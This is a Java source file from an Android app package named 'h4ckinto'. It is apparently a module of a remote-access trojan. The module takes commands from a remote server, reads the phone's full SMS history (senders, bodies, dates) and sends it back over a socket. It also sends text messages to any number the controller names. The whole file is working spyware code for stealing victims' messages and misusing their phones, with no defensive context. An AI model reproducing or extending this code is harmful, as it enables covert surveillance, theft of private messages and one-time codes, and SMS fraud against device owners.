package com.h4ckinto.android.managers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;

import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.utils.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class SMSManager {
    private static final String TAG = "SMSManager";
    
    private Context context;
    private SocketManager socketManager;

    public SMSManager(Context context) {
        this.context = context;
        this.socketManager = SocketManager.getInstance(context);
    }

    public void getSMSList() {
        if (!PermissionManager.hasSMSPermissions(context)) {
            Log.w(TAG, "SMS permissions not granted");
            return;
        }

        try {
            List<JSONObject> smsList = new ArrayList<>();
            Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                Telephony.Sms.DATE + " DESC"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ)));
                    smsList.add(sms);
                }
                cursor.close();
            }

            JSONObject smsData = new JSONObject();
            smsData.put("smslist", new JSONArray(smsList));
            socketManager.sendSMSData(smsData);
            
            Log.d(TAG, "SMS list sent to server: " + smsList.size() + " messages");
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS list", e);
        }
    }

    public void sendSMS(String phoneNumber, String message) {
        if (!PermissionManager.hasSMSPermissions(context)) {
            Log.w(TAG, "SMS permissions not granted");
            return;
        }

        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "SMS sent successfully");
            socketManager.sendSMSData(result);
            
            Log.d(TAG, "SMS sent to: " + phoneNumber);
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS", e);
            
            try {
                JSONObject result = new JSONObject();
                result.put("success", false);
                result.put("error", e.getMessage());
                socketManager.sendSMSData(result);
            } catch (Exception ex) {
                Log.e(TAG, "Error sending error response", ex);
            }
        }
    }

    public void handleSMSCommand(JSONObject command) {
        try {
            String action = command.getString("action");
            
            switch (action) {
                case "ls":
                    getSMSList();
                    break;
                case "sendSMS":
                    String to = command.getString("to");
                    String sms = command.getString("sms");
                    sendSMS(to, sms);
                    break;
                default:
                    Log.w(TAG, "Unknown SMS action: " + action);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling SMS command", e);
        }
    }
}
